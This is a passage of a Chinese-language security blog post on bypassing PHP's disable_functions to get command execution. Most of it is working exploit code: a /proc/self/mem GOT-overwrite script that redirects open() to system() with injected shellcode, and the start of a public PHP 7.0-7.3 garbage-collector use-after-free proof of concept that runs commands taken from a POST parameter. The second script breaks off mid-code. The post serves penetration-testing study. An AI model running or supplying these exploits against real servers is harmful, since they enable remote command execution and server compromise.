class="hljs-keyword">case</span> SHT_GNU_HASH:<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-comment">//                   echo &quot;who knows what $sh_type this is? &quot;;</span><br><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_reloc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$dynsym_section</span>= <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);<br>        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;rel_plt_section <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel_plt</span> )&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>]+<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>])<br>            &#123;<br>                <span class="hljs-variable">$rel_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$rel_info</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)&gt;&gt;<span class="hljs-number">32</span>;<br>                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$rel_info</span>*<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>],<span class="hljs-number">4</span>);<br>                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]+<span class="hljs-variable">$fun_name_offset</span>-<span class="hljs-number">1</span>;<br>                <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>                    <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));<br>                &#125;<br>                <span class="hljs-variable">$rel_plts</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$rel_offset</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;rel_plts=<span class="hljs-variable">$rel_plts</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shared_library</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);<br>        &#125;<br>        <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);<br>        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>])<br>        &#123;<br>            <span class="hljs-variable">$shared_library_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>);<br>            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$fun_name_offset</span>+<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]-<span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>                <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));<br>            &#125;<br>            <span class="hljs-variable">$shared_librarys</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$shared_library_offset</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;shared_librarys=<span class="hljs-variable">$shared_librarys</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">packlli</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable">$higher</span> = (<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xffffffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span>;<br>        <span class="hljs-variable">$lower</span> = <span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;V2&#x27;</span>, <span class="hljs-variable">$lower</span>, <span class="hljs-variable">$higher</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// step1：拿到open函数的got表的地址</span><br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<br><span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/proc/self/exe&#x27;</span>); <span class="hljs-comment">//解析/proc/self/exe即当前程序</span><br><span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();  <span class="hljs-comment">//获得各函数的got表的地址</span><br><span class="hljs-variable">$open_php</span>=<span class="hljs-variable">$test</span>-&gt;rel_plts[<span class="hljs-string">&#x27;open&#x27;</span>];<br><br><br><span class="hljs-comment">// step2：拿到程序基地址，栈地址，libc地址</span><br><span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/proc/self/maps&#x27;</span>);<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+)\s+.+\[stack]/&#x27;</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$stack</span>);<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+).*?libc-/&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libcgain</span>);<br><span class="hljs-variable">$libc_base</span> = <span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$libcgain</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Libc base: &quot;</span>.<span class="hljs-variable">$libc_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stack location: &quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$pie_base</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$maps</span>)[<span class="hljs-number">0</span>]));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PIE base: &quot;</span>.<span class="hljs-variable">$pie_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><br><span class="hljs-comment">// step3：计算system的实际地址</span><br><span class="hljs-variable">$test2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;#.*?(/.*libc-\d.\d\d.so)#&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libc</span>); <span class="hljs-comment">// 匹配libc</span><br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-variable">$libc</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();<br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_shared_library</span>(); <span class="hljs-comment">//获得libc中的各函数的地址</span><br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$test2</span>-&gt;shared_librarys[<span class="hljs-string">&#x27;system&#x27;</span>];  <span class="hljs-comment">//获取libc中system的偏移</span><br><span class="hljs-variable">$sys_addr</span> = <span class="hljs-variable">$sys</span> + <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc_base</span>);  <span class="hljs-comment">//加上libc基地址获得system函数的实际地址</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;system addr: &quot;</span>.<span class="hljs-variable">$sys_addr</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><br><span class="hljs-comment">// step4：修改got表指向的地址</span><br><span class="hljs-variable">$mem</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>); <span class="hljs-comment">//修改该文件相当于直接修改当前进程的内存</span><br><span class="hljs-variable">$shellcode_loc</span> = <span class="hljs-variable">$pie_base</span> + <span class="hljs-number">0x2333</span>;  <span class="hljs-comment">//随便找一个存放shellcode的地址</span><br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$open_php</span>);  <span class="hljs-comment">//文件指针定位到open函数的got表的地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$shellcode_loc</span>)); <span class="hljs-comment">//向open函数的got表的地址写入我们shellcode的存放地址</span><br><br><br><span class="hljs-comment">// step5：写入命令到shellcode，并将shellcode写入到之前指定的地址中</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;ls &gt; /var/www/html/1.txt&quot;</span>;<br><span class="hljs-comment">//$command=$_GET[&#x27;cmd&#x27;];</span><br><span class="hljs-variable">$stack</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-variable">$stack</span>);  <span class="hljs-comment">//文件指针定位到栈地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$command&#125;</span>\x00&quot;</span>);  <span class="hljs-comment">//向栈地址写入要执行的命令</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$stack</span>;  <span class="hljs-comment">//$cmd变量的值即为要执行的命令的存放地址</span><br><span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;H\xbf&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;H\xb8&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$sys_addr</span>).<span class="hljs-string">&quot;P\xc3&quot;</span>;<br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode_loc</span>); <span class="hljs-comment">//文件指针定位到之前写入open函数got表的地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode</span>); <span class="hljs-comment">//向该地址写入处理好的shellcode</span><br><br><br><span class="hljs-comment">// step6：触发open函数</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>); <span class="hljs-comment">//通过readfile函数调用open函数，在跳转到got表指向的地址即进入我们的shellcode地址执行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;DONE\n&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>其中的shellcode为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>mov rdi,0xffffffff</span><br><span class="hljs-string"><span class="hljs-meta">... </span>mov rax,0xffffffff</span><br><span class="hljs-string"><span class="hljs-meta">... </span>push rax</span><br><span class="hljs-string"><span class="hljs-meta">... </span>ret</span><br><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span><br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>asm(shellcode)<br><span class="hljs-string">b&#x27;H\xbf\xff\xff\xff\xff\x00\x00\x00\x00H\xb8\xff\xff\xff\xff\x00\x00\x00\x00P\xc3&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>利用条件</strong></p><ul><li>&#x2F;proc&#x2F;self&#x2F;mem 可读写</li><li>Linux 内核版本 &gt;&#x3D; 2.98</li><li>PHP-CGI 或 PHP-FPM 启动</li></ul><p>apache+php 由于 apache 调用 setuid 设置 www-data 权限工作进程，&#x2F;proc&#x2F;self&#x2F;mem 属于 www-data 且权限是600，&#x2F;proc&#x2F;self&#x2F; 目录属于root用户，导致没有权限读写</p><p>但是对于 Nginx+php ，且为低版本的 php-fpm（PHP&lt;5.6），&#x2F;proc&#x2F;self&#x2F;属于 www-data ，可以通过写入GOT表来实现RCE</p><blockquote><p>注：我在实际利用中并没有成功</p></blockquote><h1 id="利用UAF-Bypass"><a href="#利用UAF-Bypass" class="headerlink" title="利用UAF Bypass"></a>利用UAF Bypass</h1><p>各种利用二进制漏洞去攻击的手法<br>原理就不细说了，也不太懂pwn，放链接了</p><h2 id="php7-GC-UAF（PHP-7-0-7-3）"><a href="#php7-GC-UAF（PHP-7-0-7-3）" class="headerlink" title="php7_GC_UAF（PHP 7.0-7.3）"></a>php7_GC_UAF（PHP 7.0-7.3）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p><strong>原理</strong></p><p>通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令</p><p><a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">PHP中的内存破坏漏洞利用学习(1st)</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&quot;uname -a&quot;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span 